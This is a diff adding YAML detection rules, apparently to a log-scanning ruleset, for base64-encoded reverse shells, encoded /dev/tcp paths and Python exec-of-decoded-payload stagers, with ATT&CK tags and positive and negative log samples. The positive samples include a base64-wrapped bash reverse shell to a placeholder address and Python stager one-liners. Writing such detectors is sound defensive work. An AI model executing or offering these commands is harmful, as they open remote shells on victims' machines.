+      - 'Nov 20 12:09:00 web01 java[2001]: payload=bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuNy80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}'
+      - 'Nov 21 09:00:01 web01 java[2001]: payload=bash -c {echo,QQJhc2ggLWkgPiYgL2RldiQQ==}|{base64,-d}|{bash,-i}'
+      - 'Nov 21 09:00:02 web01 java[2001]: payload=bash -c {echo,QQiYXNoIC1pID4mIC9kZXYvQQ==}|{base64,-d}|{bash,-i}'
+      - 'Nov 21 09:00:03 web01 java[2001]: payload=bash -c {echo,QQc2ggLWkgPiYgL2RldiQQ==}|{base64,-d}|{bash,-i}'
+      - 'Nov 21 09:00:04 web01 java[2001]: payload=bash -c {echo,QQNoIC1pID4mIC9kZXYvQQ==}|{base64,-d}|{bash,-i}'
+      - 'Nov 21 09:00:05 web01 java[2001]: payload=bash -c {echo,QQL2Jpbi9zaCAtaSAyPiYxQQ==}|{base64,-d}|{bash,-i}'
+      - 'Nov 21 09:00:06 web01 java[2001]: payload=bash -c {echo,QQ9iaW4vc2ggLWkgMj4mMQQ==}|{base64,-d}|{bash,-i}'
+      - 'Nov 21 09:00:07 web01 java[2001]: payload=bash -c {echo,QQvYmluL3NoIC1pIDI+JjQQ==}|{base64,-d}|{bash,-i}'
+    negative:
+      - 'Nov 20 12:09:01 web01 cloud-init[612]: user-data: IyEvYmluL2Jhc2gKYXB0LWdldCB1cGRhdGUK'
+      - 'Nov 20 12:09:02 web01 app[700]: blob=L2V0Yy9ob3N0cw=='
+      - 'Nov 20 12:09:03 k8s01 kubelet[990]: configmap script=IyEvYmluL2Jhc2ggLWV4Cg=='
+
+- id: mention.encoded_dev_socket_base64
+  title: Base64 of a bash /dev/tcp or /dev/udp path at any byte alignment
+  match:
+    literal: ['L2Rldi90Y3Av', '9kZXYvdGNwL', 'vZGV2L3RjcC', 'L2Rldi91ZHAv', '9kZXYvdWRwL', 'vZGV2L3VkcC']
+  case_sensitive: true
+  strength: medium
+  attack: [T1027.010, T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: Sigma specification, base64offset modifier, applied to reverse-shell strings from the revshells.com catalog
+    url: https://sigmahq.io/sigma-specification/specification/sigma-modifiers-appendix.html
+    license: 'not applicable: method reference; the encoded strings are computed from public reverse-shell text'
+    upstream_id: null
+  rationale: >-
+    '/dev/tcp/' and '/dev/udp/' at the three byte alignments (fully determined characters only). Encoded bash socket
+    paths are usually reverse shells or tool-less downloads, but a base64-encoded container health check that opens
+    /dev/tcp also matches, so on its own it is medium.
+  examples:
+    positive:
+      - 'Nov 20 12:09:04 web01 java[2001]: payload=YmFzaCAtYyAnZXhlYyAzPD4vZGV2L3RjcC8yMDMuMC4xMTMuNy84MCc='
+    negative:
+      - 'Nov 20 12:09:05 web01 app[700]: tty=L2Rldi90dHkx'
+      - 'Nov 20 12:09:06 web01 app[700]: blob=L2Rldi9udWxs'
+
+- id: mention.encoded_python_exec_decode
+  title: 'Python exec() around b64decode or zlib.decompress'
+  match:
+    anchored: 'exec\( {0,2}(?:(?:__import__\(["'']base64["'']\)\.|base64\.)?b64decode|__import__\(["'']zlib["'']\)\.decompress|zlib\.decompress)\('
+  case_sensitive: true
+  strength: strong
+  attack: [T1059.006, T1140, T1027.010]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Python One-Liners with Base64 Decoding - Linux (Hugh Ryan, Swachchhanda Shrawan Poudel)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_python_base64_encoded_execution.yml
+    license: DRL-1.1
+    upstream_id: 55e862a8-dd9c-4651-807a-f21fcad56716
+  rationale: >-
+    Narrows the rule (import, base64 and a decode call in a python -c line) to the case where the decoded bytes are
+    executed directly. exec() of decoded data is the Python stager shape (Empire, Pupy, Metasploit python payloads);
+    data-processing code decodes but does not exec.
+  examples:
+    positive:
+      - 'Nov 20 12:10:00 web01 bash[708]: HISTORY: python3 -c "import base64;exec(base64.b64decode(''aW1wb3J0IHNvY2tldA==''))"'
+      - 'Nov 20 12:10:01 web01 bash[709]: HISTORY: python -c "exec(__import__(''zlib'').decompress(__import__(''base64'').b64decode(''eJx'')))"'
+    negative:
+      - 'Nov 20 12:10:02 web01 app[700]: data = base64.b64decode(payload["image"])'
+      - 'Nov 20 12:10:03 web01 bash[710]: HISTORY: python3 -c "import base64; print(base64.b64decode(''aGk=''))"'
